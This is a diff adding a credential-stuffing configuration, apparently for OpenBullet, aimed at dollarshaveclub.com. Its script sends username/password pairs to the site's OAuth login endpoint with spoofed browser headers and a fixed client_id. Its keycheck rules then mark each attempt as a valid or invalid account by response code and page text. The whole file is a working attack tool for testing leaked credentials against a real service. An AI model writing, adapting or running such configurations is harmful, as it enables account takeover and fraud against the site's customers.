@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "dollarshaveclub.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-26T14:03:49.4251094+02:00",
+  "AdditionalInfo": "",
+  "Author": "Dvildo",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.dollarshaveclub.com/api/oauth/token/full_login" 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&client_id=834a04d7-e7f6-4969-bcab-83a5859598d3" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.dollarshaveclub.com" 
+  HEADER "referer: https://www.dollarshaveclub.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<a href=\"/logout\">Logout</a>" 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "The provided resource owner credentials are not valid, or resource owner cannot be found" 
+
